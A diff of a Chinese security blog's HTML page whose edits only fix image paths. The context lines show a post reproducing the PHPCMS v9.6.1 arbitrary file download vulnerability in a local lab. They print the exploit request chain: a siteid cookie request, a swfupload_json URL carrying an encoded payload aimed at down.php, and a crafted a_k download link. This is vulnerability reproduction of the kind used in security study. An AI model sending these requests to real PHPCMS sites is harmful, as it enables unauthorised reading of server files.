@@ -23,14 +23,14 @@
 <meta property="og:site_name" content="IT技术学习分享自留地">
 <meta property="og:description" content="0x00 环境介绍 系统：Windows 10 Phpstudy 2018 CMS：PHPCMS v9.6.1 PHPCMS v9各版本下载地址：http://download.phpcms.cn/v9/9.6/">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/phpcms9-6-1/siteid.png">
-<meta property="og:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/phpcms9-6-1/att_json.png">
-<meta property="og:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/phpcms9-6-1/download.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/siteid.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/att_json.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/download.png">
 <meta property="og:updated_time" content="2019-02-26T01:56:47.470Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHPCMSv9.6.1任意文件下载漏洞复现">
 <meta name="twitter:description" content="0x00 环境介绍 系统：Windows 10 Phpstudy 2018 CMS：PHPCMS v9.6.1 PHPCMS v9各版本下载地址：http://download.phpcms.cn/v9/9.6/">
-<meta name="twitter:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/phpcms9-6-1/siteid.png">
+<meta name="twitter:image" content="https://sakuxa.com/2019/02/25/phpcms9-6-1/siteid.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -324,10 +324,10 @@
 <p>依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。</p>
 <h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p><strong>1.获取Cookie：xxx_siteid</strong></p>
 <p>首先访问<code>http://localhost/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>并获取Cookie。</p>
-<p><img src="phpcms9-6-1\siteid.png" alt></p>
+<p><img src="/2019/02/25/phpcms9-6-1/siteid.png" alt></p>
 <p><strong>2.获取Cookie：xxx_att_json</strong></p>
 <p>访问<code>http://localhost/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。</p>
-<p><img src="phpcms9-6-1\att_json.png" alt></p>
+<p><img src="/2019/02/25/phpcms9-6-1/att_json.png" alt></p>
 <p>要点：</p>
 <blockquote>
 <ul>
@@ -340,7 +340,7 @@
 <p><code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g</code></p>
 </blockquote>
 <p>访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。</p>
-<p><img src="phpcms9-6-1\download.png" alt></p>
+<p><img src="/2019/02/25/phpcms9-6-1/download.png" alt></p>
 <h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><p>得到下载连接访问页面，点击下载会报参数错误。</p>
 <p>解决办法：</p>
 <blockquote>
